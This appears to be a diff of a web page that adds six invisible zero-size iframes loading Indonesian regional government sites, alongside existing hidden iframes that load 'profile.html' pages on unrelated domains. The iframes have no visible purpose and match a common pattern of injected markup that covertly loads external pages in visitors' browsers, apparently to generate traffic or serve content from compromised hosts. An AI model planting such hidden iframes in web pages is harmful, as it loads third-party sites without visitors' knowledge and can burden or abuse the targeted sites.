@@ -28,7 +28,12 @@
 <iframe src="http://www.patro-tavier.be/source/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="http://www.manchieu.vn/lib/source/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="http://ocondominio.cloudpainel.com.br/source/profile/profile.html" width="0%" height="0"></iframe>
-
+<iframe src="http://dpr.asahankab.go.id/" width="0%" height="0"></iframe>
+<iframe src="http://polres.asahankab.go.id/" width="0%" height="0"></iframe>
+<iframe src="http://kominfo.asahankab.go.id/" width="0%" height="0"></iframe>
+<iframe src="http://kpu.asahankab.go.id/" width="0%" height="0"></iframe>
+<iframe src="http://bawaslu.asahankab.go.id/" width="0%" height="0"></iframe>
+<iframe src="http://dpd.asahankab.go.id/" width="0%" height="0"></iframe>
 
 
 <iframe src="https://www.forum-pemuda-ngadirejo.org/" width="0%" height="0"></iframe>
